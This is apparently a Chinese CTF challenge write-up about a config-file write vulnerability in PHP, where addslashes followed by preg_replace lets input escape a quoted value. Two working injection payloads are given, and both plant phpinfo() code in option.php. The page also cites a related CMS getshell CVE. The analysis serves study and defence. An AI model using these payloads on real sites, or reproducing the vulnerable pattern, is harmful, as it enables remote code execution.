# Challenge
index.php
```php
<?php
$str = addslashes($_GET['option']);
$file = file_get_contents('xxxxx/option.php');
$file = preg_replace('|\$option=\'.*\';|', "\$option='$str';", $file);
file_put_contents('xxxxx/option.php', $file);
```
xxxxx/option.php
```php
$option='test';
```
# Solution
流程如下：
1. 对传入的option参数进行addslashes，比如有单引号`'`，会变成`\'`
2. 通过正则匹配xxxxx/option.php中的`$option='xxx';`，将xxx的内容替换为经第一步处理的值
3. 替换完成，将其写入xxxxx/option.php。

场景： 用于写入配置文件等。

## 法一
先访问：
```
?option=aaa';%0aphpinfo();//
```
经过addslashes后，$str值为 `aaa\';%0aphpinfo();//`

进行正则匹配并写入文件，xxxxx/option.php的内容变为:
```php
<?php 
$option='aaa\';
phpinfo();//';
?>
```

再访问：
```
?option=xxx
```
正则匹配时，会将两个单引号里的内容即 `aaa\` ，替换为 `xxx`，此时xxxxx/option.php的内容变为
```php 
<?php
$option='xxx';
phpinfo();//';
?>
```

最后访问：/xxxxx/option.php

## 法二
访问：
```
?option=aaa\';phpinfo();//
```
经过addslashes后，$str为 `aaa\\\';phpinfo();//`

经过preg_replace正则匹配后，对`\`做了转义处理,xxxxx/option.php的内容变为：
```
<?php 
$option='aaa\\';phpinfo();//';
?>
```

最后访问：/xxxxx/option.php

# Refference 
+ p神的小秘圈
+ [l3m0n：小密圈专题(1)-配置文件写入问题](http://www.cnblogs.com/iamstudy/articles/config_file_write_vue.html)
+ [[CVE-2016-7565]Exponent CMS 2.3.9 配置文件写入 getshell分析 ](https://chybeta.github.io/2017/12/11/CVE-2016-7565-Exponent-CMS-2-3-9-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-getshell%E5%88%86%E6%9E%90/)